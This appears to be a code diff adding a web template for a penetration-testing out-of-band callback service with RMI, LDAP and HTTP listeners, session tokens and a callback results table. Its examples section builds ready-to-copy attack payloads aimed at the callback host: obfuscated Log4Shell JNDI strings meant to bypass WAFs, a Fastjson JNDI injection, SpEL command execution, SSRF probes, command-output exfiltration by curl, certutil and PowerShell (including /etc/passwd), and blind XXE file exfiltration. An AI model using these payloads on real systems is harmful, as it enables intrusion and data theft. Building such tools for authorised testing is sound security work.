@@ -1,0 +1,496 @@
+{% extends "base.html" %}
+
+{% block content %}
+<style>
+/* 反连服务样式（双栏布局：左侧回调地址，右侧 Results 免滚动直达） */
+.oob-wrap { padding: 12px 15px; }
+
+.oob-card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+  padding: 14px;
+}
+.oob-card-title {
+  color: #333; font-weight: 600; font-size: 0.98rem; margin: 0 0 10px 0;
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+}
+
+/* 顶部：服务状态 + 当前凭证（一行内展示，节省纵向空间） */
+.oob-topbar {
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  margin-bottom: 12px;
+}
+.badge-svc {
+  font-size: 0.78rem; padding: 3px 10px; border-radius: 12px;
+  background: #f1f3f5; color: #555; white-space: nowrap;
+}
+.badge-svc b { color: #00e5ff; }
+.badge-svc .dot { display: inline-block; width: 7px; height: 7px; border-radius: 50%; margin-right: 4px; }
+.dot-on { background: #1e7e34; }
+.dot-off { background: #c0392b; }
+.oob-token-inline {
+  margin-left: auto; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+  font-size: 0.85rem; color: #555;
+}
+.oob-token-inline .tk { font-family: Consolas, monospace; font-weight: 700; color: #00e5ff; font-size: 1rem; }
+
+/* 双栏布局：中部占满视口剩余高度，底部横向示例条，整页基本无纵向滚动 */
+.oob-layout {
+  display: grid;
+  grid-template-columns: 400px minmax(0, 1fr);
+  gap: 12px;
+  align-items: stretch;
+  height: calc(100vh - 210px);
+  min-height: 380px;
+  margin-bottom: 12px;
+}
+.oob-left { display: flex; flex-direction: column; gap: 12px; min-height: 0; overflow: auto; }
+.oob-right { min-width: 0; display: flex; flex-direction: column; min-height: 0; }
+.oob-right > .oob-card { flex: 1; display: flex; flex-direction: column; min-height: 0; }
+@media (max-width: 1100px) {
+  .oob-layout { grid-template-columns: 1fr; height: auto; }
+  .oob-left { overflow: visible; }
+  .oob-results-scroll { max-height: 50vh; }
+}
+
+/* 表单与地址 */
+.oob-form-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 10px; }
+.oob-form-row label { font-size: 0.83rem; color: #666; white-space: nowrap; }
+.oob-input {
+  padding: 7px 10px; border: 1px solid #dee2e6; border-radius: 8px;
+  font-size: 0.9rem; background: #f8f9fa; color: #333; width: 220px;
+}
+.oob-input:focus { outline: none; border-color: #00e5ff; box-shadow: 0 0 0 2px rgba(0,229,255,0.15); }
+
+.oob-btn {
+  padding: 6px 14px; border: none; border-radius: 8px; font-size: 0.85rem;
+  cursor: pointer; transition: background 0.15s; color: #fff; background: #00e5ff;
+}
+.oob-btn:hover { background: #0090a8; }
+.oob-btn-secondary { background: #6c757d; }
+.oob-btn-secondary:hover { background: #565e64; }
+.oob-btn-danger { background: #dc3545; }
+.oob-btn-danger:hover { background: #bb2d3b; }
+.oob-btn-mini { padding: 3px 10px; font-size: 0.75rem; margin-left: 6px; }
+
+.oob-url-item { margin-bottom: 8px; }
+.oob-url-label { font-size: 0.78rem; color: #666; margin-bottom: 2px; }
+.oob-url-box {
+  display: flex; align-items: center; gap: 8px;
+  background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 8px; padding: 6px 10px;
+}
+.oob-url-box code {
+  flex: 1; font-family: "SFMono-Regular", Consolas, monospace; font-size: 0.8rem;
+  color: #24292f; word-break: break-all; background: transparent;
+}
+
+/* 结果表格：占满视口高度、独立滚动、表头吸附 */
+.oob-results-scroll {
+  overflow: auto;
+  flex: 1;
+  min-height: 200px;
+  border: 1px solid #eee; border-radius: 8px;
+}
+.oob-table { width: 100%; border-collapse: collapse; font-size: 0.86rem; }
+.oob-table th {
+  background: #f1f3f5; color: #555; text-align: left; padding: 8px 10px;
+  border-bottom: 2px solid #dee2e6; white-space: nowrap;
+  position: sticky; top: 0; z-index: 1;
+}
+.oob-table td { padding: 7px 10px; border-bottom: 1px solid #eee; vertical-align: top; word-break: break-all; }
+.oob-table th:nth-child(2), .oob-table td:nth-child(2) { word-break: keep-all; white-space: nowrap; min-width: 64px; }
+.oob-table tr:hover td { background: #f8f9fa; }
+.badge-proto { padding: 2px 9px; border-radius: 12px; font-size: 0.72rem; color: #fff; display: inline-block; white-space: nowrap; word-break: keep-all; }
+.p-RMI  { background: #6f42c1; }
+.p-LDAP { background: #1e7e34; }
+.p-HTTP { background: #00e676; }
+
+.oob-note {
+  background: #fff8e6; border-left: 3px solid #f0ad4e; border-radius: 8px;
+  padding: 8px 10px; font-size: 0.78rem; color: #6b5900; line-height: 1.6;
+}
+.oob-empty { text-align: center; color: #999; padding: 30px; }
+.oob-refresh-info { font-size: 0.75rem; color: #999; font-weight: 400; }
+/* 利用示例卡片（底部纵向排列，宽屏多列网格、窄屏单列堆叠） */
+.oob-examples-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  gap: 12px;
+  align-items: stretch;
+}
+.oob-example {
+  display: flex; flex-direction: column;
+  border: 1px solid #e6e8eb; border-radius: 8px; background: #fff;
+}
+.oob-ex-head {
+  display: flex; align-items: center; gap: 8px; padding: 7px 10px;
+  background: #f8f9fa; border-bottom: 1px solid #eef0f2;
+  font-size: 0.82rem; font-weight: 600; color: #333;
+}
+.ex-badge { font-size: 0.68rem; color: #fff; padding: 1px 8px; border-radius: 8px; white-space: nowrap; }
+.b-jndi { background: #6f42c1; } .b-ssrf { background: #00e676; }
+.b-cmd { background: #e67e22; } .b-xxe { background: #1e7e34; }
+.b-spel { background: #16a085; } .b-basic { background: #7f8c8d; }
+/* 说明区固定两行高度（超出悬停查看），保证各卡片代码框顶部对齐 */
+.oob-ex-desc {
+  padding: 7px 10px 0; font-size: 0.75rem; color: #888; line-height: 1.5;
+  height: 43px; overflow: hidden;
+  display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical;
+}
+.oob-ex-code { position: relative; margin: 8px 10px 10px; background: #2d2d2d; border-radius: 8px; padding: 8px 60px 8px 10px; }
+.oob-ex-code code {
+  display: block; font-family: Consolas, monospace; font-size: 0.75rem;
+  color: #f8f8f2; white-space: pre-wrap; word-break: break-all; background: transparent;
+}
+.oob-ex-copy {
+  position: absolute; top: 6px; right: 6px; border: none; border-radius: 8px;
+  background: #555; color: #fff; font-size: 0.7rem; padding: 2px 8px; cursor: pointer;
+}
+.oob-ex-copy:hover { background: #00e5ff; }
+#expiredBanner {
+  display: none; background: #fdecea; border-left: 4px solid #dc3545; border-radius: 8px;
+  padding: 8px 14px; font-size: 0.88rem; color: #c0392b; margin-bottom: 12px;
+}
+
+/* 数据包图标按钮：固定尺寸、不换行、不变形 */
+.oob-pkt-btn {
+  display: inline-flex; align-items: center; justify-content: center;
+  width: 30px; height: 30px; flex: 0 0 30px;
+  border: 1px solid #d7dee8; border-radius: 8px; background: #fff;
+  color: #00e5ff; font-size: 15px; cursor: pointer;
+  transition: all 0.15s; vertical-align: middle; line-height: 1; padding: 0;
+}
+.oob-pkt-btn:hover { background: #00e5ff; border-color: #00e5ff; color: #fff; box-shadow: 0 2px 8px -2px rgba(0,229,255,0.5); }
+.oob-table td.pkt-cell { white-space: nowrap; text-align: center; }
+
+/* 完整数据包弹窗 */
+.oob-modal-wrap { position: fixed; inset: 0; z-index: 1050; display: flex; align-items: center; justify-content: center; }
+.oob-modal-mask { position: absolute; inset: 0; background: rgba(0,0,0,0.45); }
+.oob-modal {
+  position: relative; background: #fff; border-radius: 8px; width: min(860px, 92vw);
+  max-height: 82vh; display: flex; flex-direction: column; box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+}
+.oob-modal-head {
+  display: flex; align-items: center; gap: 8px; padding: 10px 14px;
+  border-bottom: 1px solid #eee; font-weight: 600; color: #333; flex-wrap: wrap;
+}
+.oob-raw-pre {
+  margin: 0; padding: 12px 14px; overflow: auto; background: #212529; color: #e9ecef;
+  font-family: Consolas, monospace; font-size: 0.78rem; line-height: 1.5;
+  white-space: pre-wrap; word-break: break-all; flex: 1; min-height: 120px; border-radius: 0 0 12px 12px;
+}
+</style>
+
+<div class="oob-wrap">
+
+  <!-- 顶部：服务状态 + 当前凭证 -->
+  <div class="oob-topbar">
+    <span class="badge-svc"><span class="dot {% if cfg.rmi_running %}dot-on{% else %}dot-off{% endif %}"></span>RMI <b>:{{ cfg.rmi_port }}</b> {% if cfg.rmi_running %}运行中{% else %}未启动{% endif %}</span>
+    <span class="badge-svc"><span class="dot {% if cfg.ldap_running %}dot-on{% else %}dot-off{% endif %}"></span>LDAP <b>:{{ cfg.ldap_port }}</b> {% if cfg.ldap_running %}运行中{% else %}未启动{% endif %}</span>
+    <span class="badge-svc"><span class="dot dot-on"></span>HTTP <b>:{{ cfg.http_callback_port }}</b> 运行中</span>
+    <div class="oob-token-inline">
+      <span>当前凭证：<span class="tk" id="myToken">{{ token }}</span></span>
+      <span>过期：<span id="myExpires">{{ expires }}</span></span>
+      <button class="oob-btn oob-btn-secondary oob-btn-mini" onclick="newToken()"><i class="bi bi-arrow-repeat"></i> 获取新凭证</button>
+    </div>
+  </div>
+
+  <!-- 凭证过期提示 -->
+  <div id="expiredBanner">
+    <i class="bi bi-exclamation-triangle"></i> 凭证已过期！请重新获取。
+    <button class="oob-btn oob-btn-danger oob-btn-mini" onclick="newToken()">重新获取凭证</button>
+  </div>
+
+  <div class="oob-layout">
+    <!-- 左栏：回调地址与用法 -->
+    <div class="oob-left">
+      <div class="oob-card">
+        <div class="oob-card-title"><i class="bi bi-link-45deg"></i>回调地址（自动绑定当前凭证）</div>
+        {% if not cfg.public_host_ready %}
+        <div class="alert alert-danger mb-3">
+          <i class="bi bi-exclamation-triangle"></i>
+          回调地址暂不可用，请联系管理员。
+        </div>
+        {% endif %}
+        <div class="oob-url-item">
+          <div class="oob-url-label">LDAP（JNDI 注入最常用）</div>
+          <div class="oob-url-box"><code id="url-ldap"></code><button class="oob-btn oob-btn-mini" onclick="copyUrl('url-ldap')"><i class="bi bi-clipboard" title="复制"></i></button></div>
+        </div>
+        <div class="oob-url-item">
+          <div class="oob-url-label">RMI</div>
+          <div class="oob-url-box"><code id="url-rmi"></code><button class="oob-btn oob-btn-mini" onclick="copyUrl('url-rmi')"><i class="bi bi-clipboard" title="复制"></i></button></div>
+        </div>
+        <div class="oob-url-item">
+          <div class="oob-url-label">HTTP</div>
+          <div class="oob-url-box"><code id="url-http"></code><button class="oob-btn oob-btn-mini" onclick="copyUrl('url-http')"><i class="bi bi-clipboard" title="复制"></i></button></div>
+        </div>
+        <div class="oob-url-item">
+          <div class="oob-url-label">Log4Shell / JNDI 完整 Payload</div>
+          <div class="oob-url-box"><code id="url-jndi"></code><button class="oob-btn oob-btn-mini" onclick="copyUrl('url-jndi')"><i class="bi bi-clipboard" title="复制"></i></button></div>
+        </div>
+
+        <div class="oob-note">
+          多用户隔离：每个会话自动分配唯一凭证，回调按凭证归属，<b>结果仅当前会话可见</b>。
+          凭证有效期 {{ cfg.session_ttl_hours }} 小时。凭证后可追加任意后缀便于区分（仍归属本凭证）。
+        </div>
+      </div>
+
+    </div>
+
+    <!-- 右栏：Results（免滚动直达，独立滚动区） -->
+    <div class="oob-right">
+      <div class="oob-card">
+        <div class="oob-card-title">
+          <i class="bi bi-list-check"></i>回调结果
+          <span class="oob-refresh-info" id="refreshInfo">每 3 秒自动刷新</span>
+          <span style="flex:1"></span>
+          <button class="oob-btn oob-btn-secondary oob-btn-mini" onclick="loadResults()"><i class="bi bi-arrow-repeat"></i> 刷新</button>
+          <button class="oob-btn oob-btn-danger oob-btn-mini" onclick="clearResults()"><i class="bi bi-trash"></i> 清空</button>
+        </div>
+        <div class="oob-results-scroll">
+          <table class="oob-table">
+            <thead>
+              <tr>
+                <th>#</th><th>Type</th><th>Record</th><th>来源 IP</th><th>Detail</th><th>Time</th><th>数据包</th>
+              </tr>
+            </thead>
+            <tbody id="resultBody">
+              <tr><td colspan="7" class="oob-empty">暂无回调记录</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 底部：常见利用示例（纵向多列网格排列） -->
+  <div class="oob-card">
+    <div class="oob-card-title"><i class="bi bi-terminal"></i>常见利用示例 <span class="oob-refresh-info">共 12 个实战场景</span></div>
+    <div id="payload-examples" class="oob-examples-row"></div>
+  </div>
+
+  <!-- 完整请求数据包弹窗 -->
+  <div id="rawModal" class="oob-modal-wrap" style="display:none;">
+    <div class="oob-modal-mask" onclick="closeRaw()"></div>
+    <div class="oob-modal">
+      <div class="oob-modal-head">
+        <span><i class="bi bi-file-earmark-text"></i> 完整请求数据包</span>
+        <span style="flex:1"></span>
+        <button class="oob-btn oob-btn-secondary oob-btn-mini" onclick="copyRaw()"><i class="bi bi-clipboard" title="复制"></i></button>
+        <button class="oob-btn oob-btn-danger oob-btn-mini" onclick="closeRaw()">关闭</button>
+      </div>
+      <pre id="rawContent" class="oob-raw-pre">加载中...</pre>
+    </div>
+  </div>
+
+</div>
+
+<!-- 复制成功提示（与传输命令页同款：右下角绿色） -->
+<div id="oobToast" style="position:fixed;bottom:20px;right:20px;z-index:1000;display:none;padding:10px 15px;border-radius:6px;border-left:4px solid #009e76;background:rgba(0,158,118,0.15);color:#009e76;font-size:0.9rem;"></div>
+
+<script>
+var RMI_PORT = {{ cfg.rmi_port }};
+var LDAP_PORT = {{ cfg.ldap_port }};
+var HTTP_PORT = {{ cfg.http_port }};                /* Web 界面反代端口（仅展示） */
+var HTTP_CB_PORT = {{ cfg.http_callback_port }};
+var HTTP_CB_HOST = {{ cfg.http_callback_host|tojson }};
+var DIRECT_HOST = {{ cfg.host|tojson }};
+var PUBLIC_HOST_READY = {{ cfg.public_host_ready|tojson }};
+var TOKEN = {{ token|tojson }};
+
+function urlHost(host) {
+  return host && host.indexOf(":") >= 0 && host[0] !== "[" ? "[" + host + "]" : host;
+}
+
+function renderUrls() {
+  if (!PUBLIC_HOST_READY) {
+    ["url-ldap","url-rmi","url-http","url-jndi"].forEach(function(id){setText(id,"回调地址暂不可用")});
+    document.querySelectorAll(".oob-url-box button").forEach(function(button){button.disabled=true});
+    return;
+  }
+  var h = urlHost(DIRECT_HOST), httpHost = urlHost(HTTP_CB_HOST), t = TOKEN;
+  var ldap = "ldap://" + h + ":" + LDAP_PORT + "/" + t;
+  var rmi  = "rmi://"  + h + ":" + RMI_PORT  + "/" + t;
+  var http = "http://" + httpHost + ":" + HTTP_CB_PORT + "/" + t;
+  setText("url-ldap", ldap);
+  setText("url-rmi", rmi);
+  setText("url-http", http);
+  setText("url-jndi", "${jndi:" + ldap + "}");
+
+  renderExamples(h, t);
+}
+
+/* ---------- 常见利用示例（结构化卡片） ---------- */
+function renderExamples(h, t) {
+  var ldapPort = LDAP_PORT, rmiPort = RMI_PORT, httpPort = HTTP_CB_PORT;
+  var hh = urlHost(HTTP_CB_HOST);
+  var E = [
+    {tag:"JNDI", cls:"b-jndi", title:"Log4Shell 检测（CVE-2021-44228）",
+     desc:"打在一切会被 Log4j2 解析的输入点：HTTP 请求头（User-Agent、X-Api-Version 等）、参数、JSON 字段。收到回调即说明存在漏洞。",
+     code:"${jndi:ldap://" + h + ":" + ldapPort + "/" + t + "}"},
+    {tag:"JNDI", cls:"b-jndi", title:"Log4j2 RMI 变体",
+     desc:"与 LDAP 等效，走 RMI 协议回调，可在 LDAP 出网被限时尝试。",
+     code:"${jndi:rmi://" + h + ":" + rmiPort + "/" + t + "}"},
+    {tag:"JNDI", cls:"b-jndi", title:"Log4j2 绕过 WAF（嵌套混淆）",
+     desc:"直接 ${jndi:...} 被 WAF 拦截时，利用 Log4j2 嵌套 lookup 混淆：",
+     code:"${${lower:j}ndi:ldap://" + h + ":" + ldapPort + "/" + t + "}\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + h + ":" + ldapPort + "/" + t + "}\n${j${::-n}di:ldap://" + h + ":" + ldapPort + "/" + t + "/vuln-A}"},
+    {tag:"JNDI", cls:"b-jndi", title:"Fastjson JNDI 注入",
+     desc:"Fastjson autoType 开启或低版本（<=1.2.47/1.2.80 特定绕过）的 POST JSON 场景：",
+     code:"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + h + ":" + ldapPort + "/" + t + "\",\"autoCommit\":true}"},
+    {tag:"SpEL", cls:"b-spel", title:"Spring SpEL 表达式注入",
+     desc:"Spring Cloud Function（CVE-2022-22963）、Spring Data Commons 等 SpEL 注入点：",
+     code:"#{new java.lang.ProcessBuilder(new java.lang.String[]{\"curl\",\"http://" + hh + ":" + httpPort + "/" + t + "\"}).start()}"},
+    {tag:"SSRF", cls:"b-ssrf", title:"SSRF 探测",
+     desc:"把 HTTP 回调地址填入目标 URL 型参数（url=、target=、image= 等），出现请求记录即存在 SSRF：",
+     code:"http://" + hh + ":" + httpPort + "/" + t},
+    {tag:"CMD", cls:"b-cmd", title:"Linux 命令执行外带（URL）",
+     desc:"命令输出拼进 URL 路径回传，Record 列直接显示执行结果：",
+     code:"curl http://" + hh + ":" + httpPort + "/" + t + "/$(whoami)\nwget -q http://" + hh + ":" + httpPort + "/" + t + "/$(id|base64|tr -d '\\n')"},
+    {tag:"CMD", cls:"b-cmd", title:"Linux 命令执行外带（POST 体）",
+     desc:"输出较长不宜进 URL 时走请求体，结果在 Detail 的 BODY 中：",
+     code:"curl -s -d \"$(cat /etc/passwd)\" http://" + hh + ":" + httpPort + "/" + t + "\ncurl -s -d \"$(ifconfig)\" http://" + hh + ":" + httpPort + "/" + t},
+    {tag:"CMD", cls:"b-cmd", title:"Windows 命令执行外带",
+     desc:"certutil / PowerShell 发起回连，带出命令输出：",
+     code:"certutil -urlcache -split -f http://" + hh + ":" + httpPort + "/" + t + "/%USERNAME% >nul\npowershell -c \"iwr http://" + hh + ":" + httpPort + "/" + t + "/$env:USERNAME\"\nfor /F %i in ('whoami') do certutil -urlcache -split -f http://" + hh + ":" + httpPort + "/" + t + "/%i >nul"},
+    {tag:"XXE", cls:"b-xxe", title:"XXE 带外读取",
+     desc:"XML 外部实体指向回调地址，通过请求记录带出数据（无回显场景）：",
+     code:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://" + hh + ":" + httpPort + "/" + t + "/xxe\">]>\n<foo>&xxe;</foo>"},
+    {tag:"XXE", cls:"b-xxe", title:"XXE 文件外带（Blind DTD）",
+     desc:"通过外部 DTD 把本地文件内容拼进回调 URL（需先托管 DTD，此处用本平台 HTTP 承载）：",
+     code:"<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://" + hh + ":" + httpPort + "/" + t + "/%file;'>\">\n%eval;\n%exfil;"},
+    {tag:"BASIC", cls:"b-basic", title:"目标出网连通性测试",
+     desc:"在目标环境直接请求回调地址，验证出网防火墙/代理策略，再决定用哪种协议：",
+     code:"curl http://" + hh + ":" + httpPort + "/" + t}
+  ];
+  var html = "";
+  E.forEach(function(e){
+    html += '<div class="oob-example">'
+      + '<div class="oob-ex-head"><span class="ex-badge ' + e.cls + '">' + e.tag + '</span>' + escapeHtml(e.title) + '</div>'
+      + (e.desc ? '<div class="oob-ex-desc" title="' + escapeHtml(e.desc) + '">' + escapeHtml(e.desc) + '</div>' : '<div class="oob-ex-desc"></div>')
+      + '<div class="oob-ex-code"><code>' + escapeHtml(e.code) + '</code><button class="oob-ex-copy" onclick="copyEx(this)"><i class="bi bi-clipboard" title="复制"></i></button></div>'
+      + '</div>';
+  });
+  document.getElementById("payload-examples").innerHTML = html;
+}
+
+function copyEx(btn) {
+  var code = btn.parentElement.querySelector("code").textContent;
+  doCopy(code, "示例 Payload");
+}
+
+function setText(id, val) { document.getElementById(id).textContent = val; }
+
+function copyUrl(id) {
+  var text = document.getElementById(id).textContent;
+  var label = { "url-ldap": "LDAP 地址", "url-rmi": "RMI 地址",
+                "url-http": "HTTP 地址", "url-jndi": "JNDI Payload" }[id] || "回调地址";
+  doCopy(text, label);
+}
+/* 通用复制：写入剪贴板 + 提示"xxx已复制"（仅 toast，不改动按钮，避免图标丢失） */
+function doCopy(text, label) {
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(text).then(function(){ showCopyToast(label + "已复制"); });
+  } else {
+    var ta = document.createElement("textarea");
+    ta.value = text; document.body.appendChild(ta);
+    ta.select(); document.execCommand("copy"); document.body.removeChild(ta);
+    showCopyToast(label + "已复制");
+  }
+}
+function showCopyToast(msg) {
+  var t = document.getElementById("oobToast");
+  t.textContent = msg;
+  t.style.display = "block";
+  clearTimeout(showCopyToast._timer);
+  showCopyToast._timer = setTimeout(function(){ t.style.display = "none"; }, 2000);
+}
+
+function escapeHtml(s) {
+  return String(s == null ? "" : s)
+    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
+}
+
+function loadResults() {
+  fetch("{{ url_for('oob.api_results') }}")
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data.expired) {
+        document.getElementById("expiredBanner").style.display = "block";
+        document.getElementById("resultBody").innerHTML =
+          '<tr><td colspan="7" class="oob-empty">凭证已过期，请重新获取</td></tr>';
+        return;
+      }
+      var tbody = document.getElementById("resultBody");
+      var items = data.items || [];
+      if (!items.length) {
+        tbody.innerHTML = '<tr><td colspan="7" class="oob-empty">暂无回调记录</td></tr>';
+        return;
+      }
+      var html = "";
+      items.forEach(function(it){
+        var rawBtn = it.has_raw
+          ? '<button class="oob-pkt-btn" title="查看完整数据包" onclick="showRaw(' + it.id + ')"><i class="bi bi-file-earmark-text"></i></button>'
+          : '<span style="color:#c3cbd6;">·</span>';
+        html += "<tr>"
+          + "<td>" + it.id + "</td>"
+          + '<td><span class="badge-proto p-' + escapeHtml(it.type) + '">' + escapeHtml(it.type) + "</span></td>"
+          + "<td>" + escapeHtml(it.record) + "</td>"
+          + "<td>" + escapeHtml(it.ip) + "</td>"
+          + "<td>" + escapeHtml(it.detail) + "</td>"
+          + "<td>" + escapeHtml(it.time) + "</td>"
+          + '<td class="pkt-cell">' + rawBtn + "</td>"
+          + "</tr>";
+      });
+      tbody.innerHTML = html;
+    })
+    .catch(function(){
+      document.getElementById("refreshInfo").textContent = "刷新失败";
+    });
+}
+
+function clearResults() {
+  if (!confirm("确定清空当前凭证的所有回调记录吗？")) return;
+  fetch("{{ url_for('oob.api_clear') }}", { method: "POST" })
+    .then(function(){ loadResults(); });
+}
+
+function newToken() {
+  if (!confirm("获取新凭证后，旧凭证的记录将不可再查看。确定继续？")) return;
+  fetch("{{ url_for('oob.api_new') }}", { method: "POST" })
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data.ok) { location.reload(); }
+    });
+}
+
+/* ---------- 完整数据包查看 ---------- */
+function showRaw(id) {
+  var modal = document.getElementById("rawModal");
+  var pre = document.getElementById("rawContent");
+  pre.textContent = "加载中...";
+  modal.style.display = "flex";
+  fetch("{{ url_for('oob.api_record', rid=0) }}".replace(/0$/, String(id)))
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data.expired) { pre.textContent = "凭证已过期，请重新获取"; return; }
+      pre.textContent = data.raw || "(无原始报文)";
+    })
+    .catch(function(){ pre.textContent = "加载失败"; });
+}
+function closeRaw() {
+  document.getElementById("rawModal").style.display = "none";
+}
+function copyRaw() {
+  var text = document.getElementById("rawContent").textContent;
+  doCopy(text, "原始数据包");
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+  renderUrls();
+  loadResults();
+  setInterval(loadResults, 3000);
+});
+</script>
+{% endblock %}
